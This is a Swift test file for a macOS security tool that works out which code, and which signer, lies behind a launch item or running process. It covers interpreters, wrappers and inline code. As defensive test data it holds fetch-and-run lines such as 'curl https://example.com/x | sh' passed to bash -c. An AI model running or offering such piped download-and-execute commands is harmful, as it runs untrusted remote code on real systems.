import XCTest
@testable import tattle

/// A launch item is signed, and a process named, by the code its command line runs: an
/// argument that only looks like that code must not stand in for it.
final class LaunchedCodeTests: XCTestCase {
    /// Apple's programs that run the code they are given, as they are on a Mac.
    private static let applesWrappers: Set<String> = [
        "/usr/bin/nohup", "/usr/bin/arch", "/usr/bin/caffeinate", "/usr/bin/time", "/usr/bin/nice", "/usr/bin/sandbox-exec",
        "/usr/bin/env", "/usr/bin/script", "/usr/bin/login", "/usr/bin/open", "/usr/bin/xargs", "/usr/bin/find",
        "/usr/bin/xcrun", "/usr/bin/sudo", "/usr/bin/screen",
    ]

    /// How a file reads: as Apple's when it is one of Apple's wrappers or in `apple`, as
    /// Apple's with a signing identifier when `identifiers` gives one, and otherwise as signed
    /// by a publisher named for its path.
    private func reading(_ path: String, apple: Set<String> = [], identifiers: [String: String] = [:]) -> CodeSignature {
        if let identifier = identifiers[path] { return CodeSignature(signer: .apple, identifier: identifier) }
        return CodeSignature(signer: apple.contains(path) || Self.applesWrappers.contains(path) ? .apple : .developerID(name: path))
    }

    /// The signer Startup shows for a command line, with files read as `reading` reads them.
    private func signer(_ program: String, _ arguments: [String], apple: Set<String> = [], identifiers: [String: String] = [:],
                        environmentPath: String? = nil) -> CodeSignature.Signer? {
        CodeSignature.read(program: program, arguments: arguments, environmentPath: environmentPath) {
            self.reading($0, apple: apple, identifiers: identifiers)
        }?.signer
    }

    /// What a command line runs, read as Startup reads it, with files read as `reading` reads them.
    private func code(_ program: String, _ arguments: [String]) -> LaunchedCode {
        LaunchedCode.started(program: program, arguments: arguments) { LaunchedCode.Identity(path: $0, signature: self.reading($0)) }
    }

    private func script(_ path: String, run program: String) -> LaunchedCode {
        .script(path: path, interpreter: URL(fileURLWithPath: program).lastPathComponent)
    }

    func testInlineCodeIsAScriptWhateverPathFollowsIt() {
        let commands: [(String, [String])] = [
            ("/bin/bash", ["-c", "curl https://example.com/x | sh", "/usr/bin/true"]),
            ("/bin/sh", ["-ec", "payload", "/bin/ls"]),
            ("/bin/zsh", ["-o", "err_exit", "-c", "payload", "/bin/ls"]),
            ("/usr/bin/python3", ["-c", "import os", "/System/Library/CoreServices/Finder.app"]),
            ("/usr/bin/python3", ["-m", "http.server", "/bin/ls"]),
            ("/usr/bin/perl", ["-e", "1", "/bin/ls"]),
            ("/usr/bin/ruby", ["-e", "1", "/bin/ls"]),
            ("/usr/bin/osascript", ["-e", "delay 600", "/bin/ls"]),
            ("/opt/homebrew/bin/node", ["-e", "1", "/bin/ls"]),
            ("/usr/bin/expect", ["-c", "spawn x", "/bin/ls"]),
            ("/usr/bin/awk", ["{ print }", "/bin/ls"]),
        ]
        for (program, arguments) in commands {
            XCTAssertEqual(signer(program, arguments), .script, "\(program) \(arguments)")
        }
    }

    func testTheScriptIsTheFirstOperandAfterTheOptionsAndTheirValues() {
        let commands: [(String, [String], String)] = [
            ("/usr/bin/perl", ["-I", "/bin", "/x/a.pl", "/bin/ls"], "/x/a.pl"),
            ("/usr/bin/python3", ["-W", "ignore", "/x/a.py"], "/x/a.py"),
            ("/bin/bash", ["--rcfile", "/bin/ls", "/x/run.sh"], "/x/run.sh"),
            ("/bin/bash", ["+o", "posix", "/x/run.sh"], "/x/run.sh"),
            ("/usr/bin/awk", ["-F", ":", "-f", "/x/p.awk", "/bin/ls"], "/x/p.awk"),
            ("/usr/bin/java", ["-cp", "/bin", "-jar", "/x/a.jar"], "/x/a.jar"),
            ("/usr/bin/tclsh", ["-encoding", "utf-8", "/x/t.tcl"], "/x/t.tcl"),
            ("/usr/bin/perl5.34", ["/x/a.pl"], "/x/a.pl"),
            ("/opt/homebrew/bin/python3.12", ["-u", "/x/a.py"], "/x/a.py"),
        ]
        for (program, arguments, path) in commands {
            XCTAssertEqual(code(program, arguments), script(path, run: program), "\(program) \(arguments)")
        }
    }

    func testEachInterpreterReadsItsOptionsByItsOwnManualPage() {
        let scripts: [(String, [String], String)] = [
            ("/bin/zsh", ["-O", "/x/run.sh", "/bin/ls"], "/x/run.sh"),
            ("/bin/bash", ["-O", "extglob", "/x/run.sh"], "/x/run.sh"),
            ("/usr/bin/perl", ["-l012", "/x/a.pl"], "/x/a.pl"),
            ("/usr/bin/perl", ["-0x1F", "/x/a.pl"], "/x/a.pl"),
        ]
        for (program, arguments, path) in scripts {
            XCTAssertEqual(code(program, arguments), script(path, run: program), "\(program) \(arguments)")
        }
        let inline: [(String, [String])] = [
            ("/usr/bin/perl", ["-lne", "/x/code", "/bin/ls"]),
            ("/usr/bin/perl", ["-0pe", "/x/code", "/bin/ls"]),
            ("/usr/bin/python3", ["+run.py", "/bin/ls"]),
            ("/usr/bin/perl", ["+run.pl", "/bin/ls"]),
        ]
        for (program, arguments) in inline {
            XCTAssertEqual(signer(program, arguments), .script, "\(program) \(arguments)")
        }
        let oneLiner = ProcessEntry.name(path: "/usr/bin/perl", arguments: ["perl", "-le", "print 1/2"], command: "perl")
        XCTAssertEqual(oneLiner.name, "perl")
        XCTAssertEqual(oneLiner.interpreter, "perl")
    }

    func testAScriptReadsAsAScriptWhoeverSignedItsFile() {
        // A script rarely carries a signature, and no interpreter runs a signed binary as its
        // script: a signed file in the script's place was read there by mistake.
        let commands: [(String, [String])] = [
            ("/opt/homebrew/bin/node", ["--diagnostic-dir", "/usr/bin/true", "/x/evil.js"]),
            ("/opt/homebrew/bin/node", ["--diagnostic-dir", "/Applications/Slack.app/Contents/MacOS/Slack", "/x/evil.js"]),
            ("/bin/bash", ["/bin/ls"]),
            ("/bin/sh", ["/x/run.sh"]),
            ("/usr/bin/java", ["-jar", "/x/server.jar"]),
        ]
        for (program, arguments) in commands {
            XCTAssertEqual(signer(program, arguments, apple: ["/usr/bin/true", "/bin/ls"]), .script, "\(program) \(arguments)")
        }
    }

    func testAScriptTheCommandLineDoesNotLocateIsAScript() {
        for (program, arguments) in [("/bin/bash", ["run.sh"]), ("/bin/sh", []), ("/usr/bin/java", ["-cp", "/x", "Main"])] {
            XCTAssertEqual(signer(program, arguments), .script, "\(program) \(arguments)")
        }
    }

    func testAWrapperIsSignedByTheProgramItRuns() {
        let commands: [(String, [String], String)] = [
            ("/usr/bin/nohup", ["/x/agent"], "/x/agent"),
            ("/usr/bin/arch", ["-arm64", "/x/agent", "-v"], "/x/agent"),
            ("/usr/bin/arch", ["-arch", "arm64", "/x/agent"], "/x/agent"),
            ("/usr/bin/caffeinate", ["-i", "-t", "60", "/x/agent"], "/x/agent"),
            ("/usr/bin/caffeinate", ["-dw", "1", "/x/agent"], "/x/agent"),
            ("/usr/bin/time", ["-o", "/bin/ls", "/x/agent"], "/x/agent"),
            ("/usr/bin/nice", ["-n", "5", "/x/agent"], "/x/agent"),
            ("/usr/bin/sandbox-exec", ["-f", "/bin/ls", "/x/agent"], "/x/agent"),
            ("/usr/bin/env", ["-u", "HOME", "PATH=/bin", "/x/agent"], "/x/agent"),
            ("/usr/bin/script", ["-q", "/dev/null", "/x/agent"], "/x/agent"),
            ("/usr/bin/login", ["-pf", "someone", "/x/agent"], "/x/agent"),
            ("/usr/bin/open", ["-a", "/Applications/X.app"], "/Applications/X.app"),
            ("/usr/bin/open", ["-a", "/Applications/X.app", "--args", "/bin/ls"], "/Applications/X.app"),
            ("/usr/bin/open", ["-g", "/Applications/X.app", "--args", "/bin/ls"], "/Applications/X.app"),
            ("/usr/bin/open", ["/Applications/X.app/"], "/Applications/X.app/"),
        ]
        for (program, arguments, code) in commands {
            XCTAssertEqual(signer(program, arguments), .developerID(name: code), "\(program) \(arguments)")
        }
        XCTAssertEqual(signer("/usr/bin/nohup", ["/bin/sh", "-c", "payload", "/bin/ls"]), .script)
        XCTAssertEqual(code("/usr/bin/nohup", ["/usr/bin/env", "python3", "/x/a.py"]), script("/x/a.py", run: "python3"))
    }

    func testApplesProgramIsKnownByItsSigningIdentifierWhateverItsPathIsCalled() {
        let commands: [(String, [String], [String: String])] = [
            ("/Users/x/agent", ["-c", "payload"], ["/Users/x/agent": "com.apple.zsh"]),
            ("/bin/BASH", ["-c", "payload"], ["/bin/BASH": "com.apple.bash"]),
            ("/Users/x/run", ["/x/agent"], ["/Users/x/run": "com.apple.nohup", "/x/agent": "com.apple.zsh"]),
            ("/usr/bin/python3", ["-c", "payload"], ["/usr/bin/python3": "com.apple.dt.xcode_select.tool-shim-public"]),
        ]
        for (program, arguments, identifiers) in commands {
            XCTAssertEqual(signer(program, arguments, identifiers: identifiers), .script, "\(program) \(arguments)")
        }
    }

    func testAProgramThatIsNotApplesRunsItsOwnCodeWhateverItNames() {
        // A program named like a wrapper runs its own code, whatever it names.
        XCTAssertEqual(signer("/Users/x/nohup", ["/bin/ls"], apple: ["/bin/ls"]), .developerID(name: "/Users/x/nohup"))
        XCTAssertEqual(signer("/Users/x/env", ["/usr/bin/nice", "/bin/ls"], apple: ["/usr/bin/nice", "/bin/ls"]), .developerID(name: "/Users/x/env"))
        XCTAssertEqual(signer("/Users/x/env", ["/Applications/Zoom.app/Contents/MacOS/zoom.us"]), .developerID(name: "/Users/x/env"), "not the publisher it names")
        XCTAssertEqual(signer("/Users/x/nohup", ["agent"]), .developerID(name: "/Users/x/nohup"), "nor nothing when what it names is not found")
        XCTAssertEqual(signer("/Users/x/env", ["-S", "payload"]), .developerID(name: "/Users/x/env"))
        XCTAssertEqual(signer("/usr/bin/nohup", ["/Users/x/env", "/bin/ls"], apple: ["/usr/bin/nohup", "/bin/ls"]), .developerID(name: "/Users/x/env"))
        XCTAssertEqual(signer("/Users/x/nohup", ["/bin/sh", "-c", "payload"], apple: ["/bin/sh"]), .script, "a script reads as one whoever starts it")
        XCTAssertEqual(signer("/usr/bin/nohup", ["/bin/ls"], apple: ["/usr/bin/nohup", "/bin/ls"]), .apple)
    }

    func testAProgramNamedWithoutAPathIsFoundAsTheJobFindsIt() throws {
        let folder = FileManager.default.temporaryDirectory.appending(path: UUID().uuidString)
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }
        let ls = folder.appending(path: "ls")
        try Data("#!/bin/sh\n".utf8).write(to: ls)
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: ls.path)

        XCTAssertEqual(signer("true", []), .developerID(name: "/usr/bin/true"), "launchd looks a bare program up on its standard path")
        XCTAssertEqual(signer("/usr/bin/nohup", ["true"]), .developerID(name: "/usr/bin/true"))
        XCTAssertEqual(signer("/usr/bin/nohup", ["ls"], environmentPath: "\(folder.path):/bin"), .developerID(name: ls.path), "on the PATH the plist sets")
        XCTAssertEqual(signer("/usr/bin/env", ["PATH=\(folder.path):/bin", "ls"]), .developerID(name: ls.path), "on the PATH env sets")
        XCTAssertEqual(signer("ls", [], environmentPath: "\(folder.path):/bin"), .developerID(name: "/bin/ls"), "launchd's own lookup ignores the job's PATH")
        // Relative to a working directory the command line does not give.
        XCTAssertNil(signer("/usr/bin/nohup", ["bin/ls"]))
        XCTAssertNil(signer("bin/ls", []))
        XCTAssertNil(signer("/usr/bin/nohup", ["ls"], environmentPath: ":/bin"), "an empty PATH entry is the working directory")
        XCTAssertNil(signer("/usr/bin/env", ["-P", folder.path, "ls"]))
        XCTAssertNil(signer("/usr/bin/nohup", ["no-such-program-anywhere"]))
    }

    func testMoreOfApplesProgramsRunTheCodeTheyAreGiven() {
        let commands: [(String, [String], String)] = [
            ("/usr/bin/xcrun", ["--sdk", "macosx", "/x/tool"], "/x/tool"),
            ("/usr/bin/sudo", ["-u", "root", "/x/agent"], "/x/agent"),
            ("/usr/bin/screen", ["-dmS", "name", "/x/agent"], "/x/agent"),
        ]
        for (program, arguments, code) in commands {
            XCTAssertEqual(signer(program, arguments), .developerID(name: code), "\(program) \(arguments)")
        }
        let files: [(String, [String], String)] = [
            ("/usr/bin/make", ["-C", "/x", "-f", "/x/Makefile", "all"], "/x/Makefile"),
            ("/usr/bin/swift", ["-I", "/bin", "/x/a.swift"], "/x/a.swift"),
            ("/usr/bin/wish", ["-geometry", "10x10", "/x/a.tcl"], "/x/a.tcl"),
        ]
        for (program, arguments, path) in files {
            XCTAssertEqual(code(program, arguments), script(path, run: program), "\(program) \(arguments)")
        }
        let scripts: [(String, [String])] = [
            ("/usr/bin/make", ["-C", "/x", "all"]),
            ("/usr/bin/make", []),
            ("/usr/bin/swift", ["-e", "print(1)", "/bin/ls"]),
        ]
        for (program, arguments) in scripts {
            XCTAssertEqual(signer(program, arguments), .script, "\(program) \(arguments)")
        }
        XCTAssertNil(signer("/usr/bin/sudo", ["-s", "/x/agent"]), "a shell runs the command")
        XCTAssertNil(signer("/usr/bin/screen", ["-S", "name", "-X", "stuff", "/x/agent"]), "a command to a running session")
    }

    func testFindIsSignedByTheProgramItsExecRuns() {
        XCTAssertEqual(signer("/usr/bin/find", ["/x", "-name", "*.log", "-exec", "/x/agent", "{}", ";"]), .developerID(name: "/x/agent"))
        XCTAssertEqual(signer("/usr/bin/find", ["/x", "-execdir", "true", "+"]), .developerID(name: "/usr/bin/true"))
        XCTAssertEqual(signer("/usr/bin/find", ["/x", "-exec", "/bin/sh", "-c", "payload", ";"]), .script)
        XCTAssertEqual(signer("/usr/bin/find", ["/x", "-name", "a"]), .apple, "find runs only its own code")
        XCTAssertNil(signer("/usr/bin/find", ["/x", "-exec", "/usr/bin/true", ";", "-ok", "/x/agent", ";"]), "two programs")
    }

    func testAWrapperWhoseProgramIsNotNamedHasNoSigner() {
        let commands: [(String, [String])] = [
            ("/usr/bin/open", ["-a", "Safari", "/bin/ls"]),
            ("/usr/bin/open", ["-b", "com.apple.Safari"]),
            // An app runs the documents it is given as it likes; a document, by an app the
            // command line does not name.
            ("/usr/bin/open", ["-a", "/Applications/X.app", "/x/run.command"]),
            ("/usr/bin/open", ["/x/run.command", "-a", "/Applications/X.app"]),
            ("/usr/bin/open", ["/Applications/X.app", "/x/run.command"]),
            ("/usr/bin/open", ["run.command"]),
            ("/usr/bin/open", ["/x/run.command"]),
            ("/usr/bin/open", ["-e", "/x/notes.txt"]),
            ("/usr/bin/open", ["/bin/ls"]),
            ("/usr/bin/env", ["-S", "/bin/sh -c payload", "/bin/ls"]),
            ("/usr/bin/nohup", []),
            // xargs adds words from its standard input to the command it runs.
            ("/usr/bin/xargs", ["-n", "1", "/x/agent"]),
            ("/usr/bin/xargs", ["/usr/bin/open", "-a", "/System/Applications/Utilities/Terminal.app"]),
            ("/usr/bin/xargs", ["/usr/bin/find", "/x", "-maxdepth", "0"]),
        ]
        for (program, arguments) in commands {
            XCTAssertNil(signer(program, arguments), "\(program) \(arguments)")
        }
    }

    func testAProgramIsSignedByItself() {
        XCTAssertEqual(signer("/bin/ls", ["-l", "/x/agent"]), .developerID(name: "/bin/ls"))
    }

    func testAProcessRunningCodeThatIsNotItsExecutableIsMarked() {
        let inline = ProcessEntry.name(path: "/bin/bash", arguments: ["bash", "-c", "curl x | sh", "/usr/bin/true"], command: "bash")
        XCTAssertEqual(inline.name, "bash", "not named after a path that follows the code")
        XCTAssertEqual(inline.interpreter, "bash")
        XCTAssertEqual(ProcessEntry.name(path: "/usr/bin/osascript", arguments: ["osascript", "-e", "delay 600"], command: "osascript").interpreter, "osascript")
        let relative = ProcessEntry.name(path: "/bin/bash", arguments: ["bash", "run.sh"], command: "bash")
        XCTAssertEqual(relative.name, "run.sh")
        XCTAssertEqual(relative.interpreter, "bash")
        let package = ProcessEntry.name(path: "/opt/node/bin/node", arguments: ["node", "."], command: "node")
        XCTAssertEqual(package.name, "node", "the package in its working directory, which the path does not name")
        XCTAssertEqual(package.interpreter, "node")
        XCTAssertEqual(ProcessEntry.name(path: "/opt/node/bin/node", arguments: ["node", "dist/"], command: "node").name, "node")
        XCTAssertEqual(ProcessEntry.name(path: "/opt/node/bin/node", arguments: ["node", ".."], command: "node").name, "node")
        let unreadable = ProcessEntry.name(path: "/bin/bash", arguments: nil, command: "bash")
        XCTAssertEqual(unreadable.name, "bash")
        XCTAssertEqual(unreadable.interpreter, "bash", "another user's arguments cannot be read, so what its shell runs is unknown")
        let perl = ProcessEntry.name(path: "/usr/bin/perl5.34", arguments: ["perl5.34", "/x/a.pl"], command: "perl5.34")
        XCTAssertEqual(perl.name, "a.pl")
        XCTAssertEqual(perl.interpreter, "perl5.34")
        let wrapper = ProcessEntry.name(path: "/usr/bin/caffeinate", arguments: ["caffeinate", "-i", "/x/agent"], command: "caffeinate")
        XCTAssertEqual(wrapper.name, "caffeinate", "a running wrapper runs its own code: the program is its child")
        XCTAssertNil(wrapper.interpreter)
    }

    func testAnInterpreterLaunchdStartsOnItsStandardInputRunsAScript() {
        // launchd gives a job no terminal: its standard input is a file the plist names, or a
        // pipe, so what it reads is a script. Under a terminal, a person may be typing.
        let job = ProcessEntry.name(path: "/bin/sh", arguments: ["sh"], command: "sh", startedByLaunchd: true)
        XCTAssertEqual(job.name, "sh")
        XCTAssertEqual(job.interpreter, "sh")
        XCTAssertNil(ProcessEntry.name(path: "/bin/zsh", arguments: ["-zsh"], command: "zsh").interpreter)
    }

    func testPythonIsAnInterpreterInProcessesUnderItsFrameworkName() {
        let python = "/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python"
        let apple = CodeSignature(signer: .apple, identifier: "com.apple.python3")
        let inline = ProcessEntry.name(path: python, arguments: [python, "-c", "payload"], command: "Python", signature: apple)
        XCTAssertEqual(inline.interpreter, "Python")
        let script = ProcessEntry.name(path: python, arguments: [python, "/x/a.py"], command: "Python", signature: apple)
        XCTAssertEqual(script.name, "a.py")
        let brew = "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Resources/Python.app/Contents/MacOS/Python"
        XCTAssertEqual(ProcessEntry.name(path: brew, arguments: [brew, "/x/a.py"], command: "Python").name, "a.py", "known by name when not Apple's")
        let renamed = ProcessEntry.name(path: "/x/agent", arguments: ["agent", "-c", "payload"], command: "agent",
                                        signature: CodeSignature(signer: .apple, identifier: "com.apple.zsh"))
        XCTAssertEqual(renamed.interpreter, "agent", "Apple's program by its signing identifier")
    }

    func testASwiftScriptRunsInSwiftsFrontend() {
        // swift runs a script by replacing itself with its frontend, which also compiles.
        let frontend = "/Library/Developer/CommandLineTools/usr/bin/swift-frontend"
        let apple = CodeSignature(signer: .apple, identifier: "com.apple.swift-frontend")
        let script = ProcessEntry.name(path: frontend, arguments: [frontend, "-frontend", "-interpret", "/x/a.swift", "-sdk", "/x/sdk"],
                                       command: "swift-frontend", signature: apple)
        XCTAssertEqual(script.name, "a.swift")
        XCTAssertEqual(script.interpreter, "swift-frontend")
        let compile = ProcessEntry.name(path: frontend, arguments: [frontend, "-frontend", "-c", "/x/a.swift", "-primary-file", "/x/a.swift"],
                                        command: "swift-frontend", signature: apple)
        XCTAssertEqual(compile.name, "swift-frontend")
        XCTAssertNil(compile.interpreter, "compiling, it runs its own code")
        // The toolchain's swift is a symlink to the frontend, which then runs as the driver.
        let driver = "/Library/Developer/CommandLineTools/usr/bin/swift"
        XCTAssertEqual(signer(driver, ["/x/a.swift"], identifiers: [driver: "com.apple.swift-frontend"]), .script)
    }

    func testARunningJavaIsAProgramAndAJobRunThroughJavaIsSignedByItsJar() {
        let named = ProcessEntry.name(path: "/Library/Java/JavaVirtualMachines/x.jdk/Contents/Home/bin/java",
                                      arguments: ["java", "-jar", "/x/server.jar"], command: "java")
        XCTAssertEqual(named.name, "java")
        XCTAssertNil(named.interpreter, "a JVM's row is the program, not a script")
        XCTAssertEqual(code("/usr/bin/java", ["-jar", "/x/server.jar"]), script("/x/server.jar", run: "/usr/bin/java"), "not Apple's /usr/bin/java")
    }

    func testAProcessRunningAScriptIsSignedAsAScriptAndItsInterpreterApart() {
        let named = ProcessEntry.name(path: "/bin/bash", arguments: ["bash", "-c", "curl x | sh", "/usr/bin/true"], command: "bash")
        let entries = [
            ProcessEntry(pid: 1, parentPid: 0, uid: 0, name: "launchd", path: "/sbin/launchd", started: Date()),
            ProcessEntry(pid: 700, parentPid: 1, uid: 501, name: named.name, path: "/bin/bash", interpreter: named.interpreter, started: Date()),
        ]
        let snapshot = ProcessSnapshot.build(entries: entries, previous: nil, signature: { _ in CodeSignature(signer: .apple) }, responsible: { _ in nil })
        let group = snapshot.group(id: "pid:700")
        XCTAssertEqual(group?.facts.first { $0.name == "Signed by" }?.value, "script, not signed", "the detail and the prompt")
        XCTAssertEqual(group?.isApplesProgram, false, "no shipped rule about Apple's bash")
        let item = snapshot.item(pid: 700)
        XCTAssertEqual(item?.facts.first { $0.name == "Signed by" }?.value, "script, not signed")
        XCTAssertEqual(item?.facts.first { $0.name == "Interpreter signed by" }?.value, "Apple")
        XCTAssertEqual(item?.isApplesProgram, false)
    }

    func testInlineCodeLaunchdStartsIsNotPartOfMacOS() {
        let named = ProcessEntry.name(path: "/bin/zsh", arguments: ["zsh", "-c", "while :; do sleep 1; done"], command: "zsh")
        let entries = [
            ProcessEntry(pid: 1, parentPid: 0, uid: 0, name: "launchd", path: "/sbin/launchd", started: Date()),
            ProcessEntry(pid: 700, parentPid: 1, uid: 501, name: named.name, path: "/bin/zsh", interpreter: named.interpreter, started: Date()),
        ]
        let snapshot = ProcessSnapshot.build(entries: entries, previous: nil, signature: { _ in CodeSignature(signer: .apple) }, responsible: { _ in nil })
        XCTAssertEqual(snapshot.group(id: "pid:700")?.kind, .process)
        XCTAssertEqual(snapshot.group(id: "pid:700")?.leader?.signerText, "zsh script")
    }
}
